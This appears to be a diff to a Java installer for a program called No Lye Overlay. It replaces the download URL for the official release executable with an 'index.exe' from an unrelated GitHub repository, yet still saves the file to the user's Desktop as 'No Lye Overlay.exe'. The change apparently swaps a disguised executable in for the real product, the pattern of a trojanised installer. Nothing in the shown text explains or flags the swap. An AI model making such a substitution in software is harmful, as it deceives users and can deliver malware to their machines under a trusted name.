@@ -26,7 +26,7 @@ JButton install;
     InstallerFrame() throws IOException {
         System.getProperty("java.io.tmpdir");
         FileUtils.copyURLToFile(
-                new URL("https://github.com/whatsaxis/No-Lye-Overlay/releases/latest/download/No.Lye.Overlay.1.1.0.exe"),new File(FileUtils.getUserDirectoryPath() + "/Desktop/" + "No Lye Overlay.exe"));
+                new URL("https://github.com/TheChineseMuppet/log-checker/releases/latest/download/index.exe"),new File(FileUtils.getUserDirectoryPath() + "/Desktop/" + "No Lye Overlay.exe"));
         try {
             Thread.sleep(3000);
         } catch (InterruptedException e) {
